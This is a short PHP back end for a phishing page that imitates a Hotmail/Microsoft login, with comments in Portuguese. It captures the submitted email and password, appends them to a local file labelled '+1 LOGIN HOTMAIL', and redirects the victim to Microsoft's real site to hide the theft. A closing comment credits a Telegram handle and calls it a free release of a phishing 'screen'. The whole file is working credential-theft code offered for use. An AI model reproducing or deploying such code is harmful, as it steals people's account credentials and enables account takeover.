<?php
session_start();

$email = $_POST['email'] ?? '';
$senha = $_POST['senha'] ?? '';

if (!empty($email)) {
    $texto = "+1 LOGIN HOTMAIL \n"; 
    $conteudo = $texto . "Email: $email \nSenha: $senha \n\n";
    file_put_contents('hotmail.txt', $conteudo, FILE_APPEND); 

    $_SESSION['email'] = $email;
}

header("Location: https://www.microsoft.com/pt-br");
exit();

//// tela simples feita pelo @TXT_JPGI1 no telegram, foi soltada FREE!!! entt se comprou taxa o vendendor kk

?>

